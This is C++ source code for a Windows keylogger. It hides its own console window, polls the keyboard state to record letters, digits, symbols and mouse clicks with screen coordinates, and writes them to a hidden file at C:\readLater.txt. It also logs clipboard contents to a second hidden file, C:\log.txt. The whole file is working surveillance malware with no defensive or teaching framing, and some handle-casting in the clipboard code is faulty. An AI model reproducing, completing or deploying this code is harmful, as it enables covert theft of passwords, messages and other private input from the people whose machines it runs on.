#include <Windows.h>
#include <fstream>
#include <string>
#include <iostream>
#include <vector>
#include <stdio.h>
#include <thread>
#include "VirtualKeys.h"
#pragma warning(disable:4996)
#define CLIP_TEXT CF_TEXT

using namespace std;

ofstream file;
FILE* fout;
HWND stealth;
HANDLE hGetClipboard;
string clipBoard = "";
DWORD start;
DWORD interval = (DWORD)10000; // 10 second pause is returned
DWORD goal;
POINT P;
bool pause;
bool type;
bool CTRLV = true;
const int AMTKEYS = 40;
int VK_KEYS[AMTKEYS];
int OUT_KEYS[AMTKEYS];
int SHIFT_KEYS[10];
bool KEY(int);
bool isShift();
bool isCaps();
bool isLower();
void generate();
void keyboard();
void tickUp();
void main(){
	thread type(keyboard);
	type.join();
}
void tickUp(){
	pause = false;
	start = GetTickCount();
	goal = start + interval;
}
void keyboard(){
	srand((unsigned int)time(NULL));
	generate();
	tickUp();
	while (type){
		if (!pause && (start = GetTickCount()) < goal){
			pause = true;
			file << "\n";
		}
		for (int i = 0; i < AMTKEYS; i++){
			KEY(i);
		}
		if (((GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0) || (GetAsyncKeyState(VK_RBUTTON) & 0x8000) != 0){
			GetCursorPos(&P);
			if (((GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0)){
				file << "\n Left-Click";
			}
			else 
				file << "\n Right-Click";

			file << "(" << P.x << ", " << P.y << ")\n";
			do{
				Sleep(1);
			} while (((GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0) || (GetAsyncKeyState(VK_RBUTTON) & 0x8000) != 0);
		}
		if ((GetAsyncKeyState(VK_BACK) & 0x8000) != 0){
			tickUp();
			file << (char)OUT_KEYS[28] << " " << '\b';
			Sleep(120);
		}
		if ((GetAsyncKeyState(VK_ESCAPE) & 0x8000) != 0){
			type = false;
		}
		if (OpenClipboard(0) && CTRLV){
			CTRLV = false;
			if ((hGetClipboard = GetClipboardData(CLIP_TEXT))){
				fout = fopen("C:\\log.txt", "a");
				SetFileAttributes("C:\\log.txt", FILE_ATTRIBUTE_HIDDEN);
				if (!fout){
					SetFileAttributes("C:\\log.txt", FILE_ATTRIBUTE_NORMAL);
					fout = fopen("C:\\log.txt", "a");
					SetFileAttributes("C:\\log.txt", FILE_ATTRIBUTE_HIDDEN);
				}
				if (fout){
					char *szData = (char*)GlobalLock(hGetClipboard);
					fputs(szData, fout);
					clipBoard = (char*)hGetClipboard;
					fputs((char *)hGetClipboard, fout);
					fputs("\n", fout);
					fclose(fout);
					CloseClipboard();
				}
				else
					printf("[!] Can't open the file!");
			}
			else
				printf("[!] Can't get the text from the clipboard!");
			CloseClipboard();
		}
		else
			printf("[!] Can't open the clipboard!");
		if (OpenClipboard(0) && !CTRLV){
			if ((hGetClipboard = GetClipboardData(CLIP_TEXT))){
				if (clipBoard != (char*)hGetClipboard){
					CTRLV = true;
				}
			}
			CloseClipboard();
		}
	}
	file.close();
	
}
void generate(){
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	type = true;
	file.open("C:\\readLater.txt");
	SetFileAttributes("C:\\readLater.txt", FILE_ATTRIBUTE_HIDDEN);
	if (!file.is_open()){
		SetFileAttributes("C:\\readLater.txt", FILE_ATTRIBUTE_NORMAL);
		file.open("C:\\readLater.txt");
		SetFileAttributes("C:\\readLater.txt", FILE_ATTRIBUTE_HIDDEN);
	}
	VK_KEYS[0] = VK_A;
	VK_KEYS[1] = VK_B;
	VK_KEYS[2] = VK_C;
	VK_KEYS[3] = VK_D;
	VK_KEYS[4] = VK_E;
	VK_KEYS[5] = VK_F;
	VK_KEYS[6] = VK_G;
	VK_KEYS[7] = VK_H;
	VK_KEYS[8] = VK_I;
	VK_KEYS[9] = VK_J;
	VK_KEYS[10] = VK_K;
	VK_KEYS[11] = VK_L;
	VK_KEYS[12] = VK_M;
	VK_KEYS[13] = VK_N;
	VK_KEYS[14] = VK_O;
	VK_KEYS[15] = VK_P;
	VK_KEYS[16] = VK_Q;
	VK_KEYS[17] = VK_R;
	VK_KEYS[18] = VK_S;
	VK_KEYS[19] = VK_T;
	VK_KEYS[20] = VK_U;
	VK_KEYS[21] = VK_V;
	VK_KEYS[22] = VK_W;
	VK_KEYS[23] = VK_X;
	VK_KEYS[24] = VK_Y;
	VK_KEYS[25] = VK_Z;
	VK_KEYS[28] = VK_TAB;
	VK_KEYS[27] = VK_RETURN;
	VK_KEYS[26] = VK_SPACE;
	VK_KEYS[29] = VK_0;
	VK_KEYS[30] = VK_1;
	VK_KEYS[31] = VK_2;
	VK_KEYS[32] = VK_3;
	VK_KEYS[33] = VK_4;
	VK_KEYS[34] = VK_5;
	VK_KEYS[35] = VK_6;
	VK_KEYS[36] = VK_7;
	VK_KEYS[37] = VK_8;
	VK_KEYS[38] = VK_9;
	OUT_KEYS[0] = 'A';
	OUT_KEYS[1] = 'B';
	OUT_KEYS[2] = 'C';
	OUT_KEYS[3] = 'D';
	OUT_KEYS[4] = 'E';
	OUT_KEYS[5] = 'F';
	OUT_KEYS[6] = 'G';
	OUT_KEYS[7] = 'H';
	OUT_KEYS[8] = 'I';
	OUT_KEYS[9] = 'J';
	OUT_KEYS[10] = 'K';
	OUT_KEYS[11] = 'L';
	OUT_KEYS[12] = 'M';
	OUT_KEYS[13] = 'N';
	OUT_KEYS[14] = 'O';
	OUT_KEYS[15] = 'P';
	OUT_KEYS[16] = 'Q';
	OUT_KEYS[17] = 'R';
	OUT_KEYS[18] = 'S';
	OUT_KEYS[19] = 'T';
	OUT_KEYS[20] = 'U';
	OUT_KEYS[21] = 'V';
	OUT_KEYS[22] = 'W';
	OUT_KEYS[23] = 'X';
	OUT_KEYS[24] = 'Y';
	OUT_KEYS[25] = 'Z';
	OUT_KEYS[28] = '\n';
	OUT_KEYS[27] = '\n';
	OUT_KEYS[26] = ' ';
	OUT_KEYS[29] = '0';
	OUT_KEYS[30] = '1';
	OUT_KEYS[31] = '2';
	OUT_KEYS[32] = '3';
	OUT_KEYS[33] = '4';
	OUT_KEYS[34] = '5';
	OUT_KEYS[35] = '6';
	OUT_KEYS[36] = '7';
	OUT_KEYS[37] = '8';
	OUT_KEYS[38] = '9';
	VK_KEYS[39] = VK_OEM_PERIOD;
	OUT_KEYS[39] = '.';
	SHIFT_KEYS[0] = ')';
	SHIFT_KEYS[1] = '!';
	SHIFT_KEYS[2] = '@';
	SHIFT_KEYS[3] = '#';
	SHIFT_KEYS[4] = '$';
	SHIFT_KEYS[5] = '%';
	SHIFT_KEYS[6] = '^';
	SHIFT_KEYS[7] = '&';
	SHIFT_KEYS[8] = '*';
	SHIFT_KEYS[9] = '(';



}
bool isShift(){

	//bool l = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 ;
	return GetAsyncKeyState(VK_SHIFT) < 0;
	//bool r = ((GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0);
	//return l || r;
}
bool isCaps(){
	return (GetAsyncKeyState(VK_CAPITAL) & 1) ? true : false;
}
bool isLower(){
	bool b_should_upper = (isCaps() && isShift()) || (!isCaps() && !isShift());
	return b_should_upper;
}
bool KEY(int vKey){
	
	if (vKey < 26){
		int add = 0;
		if ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0){
			tickUp();
			if (isLower()){
				add = 32;
			}
			int count = 0;
			// do corresponding key's task
			file << (char)(OUT_KEYS[vKey]+add);
			do{
				if (count++ > 500){
					count = 0;
					file << (char)(OUT_KEYS[vKey]+add);
				}
				Sleep(6);
			} while ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0);
		}
		return false;
	}
	if (vKey > 28 && vKey < 39){
		if ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0){
			tickUp();
			int count = 0;
			if (isShift()){
				file << (char)(SHIFT_KEYS[vKey - 29]);
				do{
					if (count++ > 500){
						count = 0;
						file << (char)(SHIFT_KEYS[vKey - 29]);
					}
					Sleep(10);
				} while ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0);
				return false;
			}
			// do corresponding key's task
			file << (char)(OUT_KEYS[vKey]);
			do{
				if (count++ > 500){
					count = 0;
					file << (char)(OUT_KEYS[vKey]);
				}
				Sleep(10);
			} while ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0);
		}
		return false;
	}
	if ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0){
		if (vKey == VK_RETURN || vKey == VK_TAB){
			pause = true;
		}
		else{
			tickUp();
		}
		int count = 0;
		// do corresponding key's task
		file << (char)OUT_KEYS[vKey];
		do{
			if (count++ > 500){
				count = 0;
				file << (char)OUT_KEYS[vKey];
			}
			Sleep(10);
		} while ((GetAsyncKeyState(VK_KEYS[vKey]) & 0x8000) != 0);
	}
	return false;
}